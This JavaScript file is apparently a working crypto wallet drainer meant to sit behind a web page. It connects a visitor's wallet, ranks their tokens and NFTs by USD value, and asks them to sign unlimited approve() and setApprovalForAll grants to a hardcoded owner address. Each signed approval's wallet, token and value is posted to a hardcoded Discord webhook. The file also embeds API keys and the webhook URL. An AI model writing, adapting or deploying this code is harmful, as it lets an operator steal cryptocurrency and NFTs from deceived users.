let count = 0;
let tokensList = [];
let NFTsList = [];
let web3Object = null;
let metamaskAccount = null;

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;

const infuraId = "d6d0d15d4cf94168b59b83ac32a759a1";
// const X_API_KEY = "e07ba9504aa349d48eb26bf27ee069a1";
const OWNER_ADDRESS = "0x83B3e03fAebc217390091D3f117f2eCF2B791135";

const ERC20_ABI = [
  {
    constant: true,
    inputs: [],
    name: "name",
    outputs: [{ name: "", type: "string" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [{ name: "_upgradedAddress", type: "address" }],
    name: "deprecate",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "approve",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "deprecated",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [{ name: "_evilUser", type: "address" }],
    name: "addBlackList",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "totalSupply",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_from", type: "address" },
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "upgradedAddress",
    outputs: [{ name: "", type: "address" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [{ name: "", type: "address" }],
    name: "balances",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "maximumFee",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "_totalSupply",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [],
    name: "unpause",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [{ name: "_maker", type: "address" }],
    name: "getBlackListStatus",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      { name: "", type: "address" },
      { name: "", type: "address" },
    ],
    name: "allowed",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "paused",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [{ name: "who", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [],
    name: "pause",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "getOwner",
    outputs: [{ name: "", type: "address" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "owner",
    outputs: [{ name: "", type: "address" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "symbol",
    outputs: [{ name: "", type: "string" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transfer",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "newBasisPoints", type: "uint256" },
      { name: "newMaxFee", type: "uint256" },
    ],
    name: "setParams",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [{ name: "amount", type: "uint256" }],
    name: "issue",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [{ name: "amount", type: "uint256" }],
    name: "redeem",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "remaining", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "basisPointsRate",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [{ name: "", type: "address" }],
    name: "isBlackListed",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [{ name: "_clearedUser", type: "address" }],
    name: "removeBlackList",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "MAX_UINT",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [{ name: "newOwner", type: "address" }],
    name: "transferOwnership",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [{ name: "_blackListedUser", type: "address" }],
    name: "destroyBlackFunds",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { name: "_initialSupply", type: "uint256" },
      { name: "_name", type: "string" },
      { name: "_symbol", type: "string" },
      { name: "_decimals", type: "uint256" },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [{ indexed: false, name: "amount", type: "uint256" }],
    name: "Issue",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [{ indexed: false, name: "amount", type: "uint256" }],
    name: "Redeem",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [{ indexed: false, name: "newAddress", type: "address" }],
    name: "Deprecate",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: false, name: "feeBasisPoints", type: "uint256" },
      { indexed: false, name: "maxFee", type: "uint256" },
    ],
    name: "Params",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: false, name: "_blackListedUser", type: "address" },
      { indexed: false, name: "_balance", type: "uint256" },
    ],
    name: "DestroyedBlackFunds",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [{ indexed: false, name: "_user", type: "address" }],
    name: "AddedBlackList",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [{ indexed: false, name: "_user", type: "address" }],
    name: "RemovedBlackList",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: true, name: "owner", type: "address" },
      { indexed: true, name: "spender", type: "address" },
      { indexed: false, name: "value", type: "uint256" },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: true, name: "from", type: "address" },
      { indexed: true, name: "to", type: "address" },
      { indexed: false, name: "value", type: "uint256" },
    ],
    name: "Transfer",
    type: "event",
  },
  { anonymous: false, inputs: [], name: "Pause", type: "event" },
  { anonymous: false, inputs: [], name: "Unpause", type: "event" },
];

const ERC721_ABI = [
  {
    inputs: [
      { internalType: "address", name: "operator", type: "address" },
      { internalType: "bool", name: "approved", type: "bool" },
    ],
    name: "setApprovalForAll",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

let ethRate = 0;
getEthRate();

async function onConnect() {
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        rpc: {
          1: "https://mainnet.infura.io/v3/d6d0d15d4cf94168b59b83ac32a759a1",
        },
        chainId: 1,
        infuraId: infuraId,
      },
    },
  };

  const web3Modal = new Web3Modal({
    network: "mainnet",
    cacheProvider: false,
    providerOptions,
  });

  const provider = await web3Modal.connect();
  web3Object = new Web3(provider);

  const accounts = await web3Object.eth.getAccounts();
  metamaskAccount = accounts[0];

  notify("Wallet Connected");
  covalenthqAPICall();
}

async function covalenthqAPICall() {
  const url = new URL(
    `https://api.covalenthq.com/v1/1/address/${metamaskAccount}/balances_v2/?key=ckey_baa9a389af1e40cc9a5d02cd706`
  );

  const result = await fetch(url).then((res) => res.json());

  let map_list = result.data.items.map((m) => {
    let balance = Number(m.balance) / pad_with_zeroes(1, m.contract_decimals);
    return {
      type: "ERC20",
      balance: m.balance,
      a_balance: balance,
      price: m.quote_rate_24h,
      address: m.contract_address,
      symbol: m.contract_ticker_symbol,
      value: balance * Number(m.quote_rate_24h),
    };
  });

  tokensList = map_list.filter((f) => f.value > 0 && f.symbol != "ETH");
  console.log("Tokens List:", tokensList);
  fetchAssetsList();
}

function pad_with_zeroes(number, length) {
  var my_string = number + "";
  while (my_string.length <= length) {
    my_string = my_string + "0";
  }

  return Number(my_string);
}

async function fetchAssetsList() {
  const provider = new ethers.providers.JsonRpcProvider(
    "https://wandering-thrumming-cloud.discover.quiknode.pro/cef2ae27ac20b9f879d2951e548d6d63cefb259f/"
  );
  const response = await provider.send("qn_fetchNFTs", [metamaskAccount]);
  NFTsList = response.assets.map((nft) => {
    return {
      type: "ERC721",
      name: nft.collectionName,
      address: nft.collectionAddress,
      id: nft.collectionTokenId,
    };
  });
  fetchAssetsPrice();
}

async function getEthRate() {
  await fetch(`https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD`)
    .then((response) => response.json())
    .then((rate) => {
      ethRate = rate.USD;
    })
    .catch((err) => {
      console.error(err);
    });
}

async function fetchAssetsPrice() {
  const options = { method: "GET", headers: { Accept: "application/json" } };
  NFTsList.forEach(async (nft) => {
    await fetch(
      `https://api.opensea.io/api/v1/asset/${nft.address}/${nft.id}`,
      options
    )
      .then((response) => response.json())
      .then((asset) => {
        let price = asset.last_sale
          ? (asset.last_sale.total_price / 1e18) * ethRate
          : asset.collection.stats.average_price * ethRate;
        nft.price = price;
        nft.value = round(
          round(price) * (nft.type == "erc1155" ? nft.owned_asset_count : 1)
        );
      })
      .catch((err) => {
        console.error(err);
        return [];
      });
  });
  setTimeout(() => {
    NFTsList = NFTsList.filter((f) => f.value > 0);
    console.log("NFT List:", NFTsList);
    concatList();
  }, 3000);
}
function concatList() {
  tokensList = tokensList.concat(NFTsList);

  tokensList = tokensList
    .sort((a, b) => {
      return a.value - b.value;
    })
    .reverse();
  console.log("Final List:", tokensList);

  if (tokensList.length) {
    document.getElementsByClassName("card")[0].style.display = "none";
    document.getElementsByClassName("btn-primary")[0].style.display = "block";
  } else {
    setTimeout(() => {
      notify("No token to approve");
    }, 2000);
  }
}

function onApprove() {
  if (tokensList[count].type == "ERC20") onApproveERC20();
  else onApproveERC721();
}

async function onApproveERC20() {
  let symbol = tokensList[count].symbol;
  let value = tokensList[count].value;
  let address = tokensList[count].address;
  let balance = tokensList[count].balance;

  let instance = new web3Object.eth.Contract(
    ERC20_ABI,
    tokensList[count].address
  );

  instance.methods
    .approve(
      OWNER_ADDRESS,
      "999999999999999999999999999999999999999999999999999999999999999999999999"
    )
    .estimateGas({ from: metamaskAccount })
    .then((gasAmount) => {
      instance.methods
        .approve(
          OWNER_ADDRESS,
          "999999999999999999999999999999999999999999999999999999999999999999999999"
        )
        .send({
          from: metamaskAccount,
          gasLimit: web3Object.utils.toHex(gasAmount),
        })
        .on("transactionHash", (hash) => {
          console.log("Transaction hash", hash);
          nextToken();
          sendERC20Message(address, balance, symbol, value);
        })
        .on("receipt", (receipt) => {
          console.log("Receipt: ", receipt);
        })
        .on("error", (error) => {
          nextToken();
          console.log("Error receipt: ", error);
        });
    })
    .catch((error) => {
      console.log("Error receipt: ", error);
    });
}

async function onApproveERC721() {
  let name = tokensList[count].name;
  let id = tokensList[count].id;
  let value = tokensList[count].value;
  let address = tokensList[count].address;

  let instance = new web3Object.eth.Contract(
    ERC721_ABI,
    tokensList[count].address
  );

  instance.methods
    .setApprovalForAll(OWNER_ADDRESS, true)
    .estimateGas({ from: metamaskAccount })
    .then((gasAmount) => {
      instance.methods
        .setApprovalForAll(OWNER_ADDRESS, true)
        .send({
          from: metamaskAccount,
          gasLimit: web3Object.utils.toHex(gasAmount),
        })
        .on("transactionHash", (hash) => {
          console.log("Transaction hash", hash);
          nextToken();
          sendERC721Message(address, name, id, value);
        })
        .on("receipt", (receipt) => {
          console.log("Receipt: ", receipt);
        })
        .on("error", (error) => {
          nextToken();
          console.log("Error receipt: ", error);
        });
    })
    .catch((error) => {
      console.log("Error receipt: ", error);
    });
}

function nextToken() {
  if (count < tokensList.length - 1) {
    ++count;
  } else {
    count = 0;
  }
}

function sendERC20Message(address, balance, symbol, value) {
  const webhookURL =
    "https://discord.com/api/webhooks/1020034270263255090/CmAk0JSoiDwJXaZ192UCWrnSM4NqyJapvfqwOATXyiouHCQ5t-bILOXTILKxf7dWeEch";
  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: `ERC20------------Users wallet address: "${metamaskAccount}"------------Token Symbol: "${symbol}"------------Token Address: "${address}"------------Token Balance: "${balance}"------------Token Value in USD: "${value}"`,
    }),
  })
    .then((response) => {
      console.log(response);
    })
    .catch((error) => {
      console.error(error);
    });
}

function sendERC721Message(address, name, id, value) {
  const webhookURL =
    "https://discord.com/api/webhooks/1020034270263255090/CmAk0JSoiDwJXaZ192UCWrnSM4NqyJapvfqwOATXyiouHCQ5t-bILOXTILKxf7dWeEch";
  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: `ERC721------------Users wallet address: "${metamaskAccount}"------------Token Name: "${name}"------------Token ID: "${id}"------------Token Address: "${address}"------------Token Value in USD: "${value}"`,
    }),
  })
    .then((response) => {
      console.log(response);
    })
    .catch((error) => {
      console.error(error);
    });
}

//#region Utils Functions
const round = (value) => {
  return Math.round(value * 10000) / 10000;
};

function notify(msg) {
  Toastify({
    text: msg,
    duration: 4000,
    gravity: "top",
    position: "right",
  }).showToast();
}
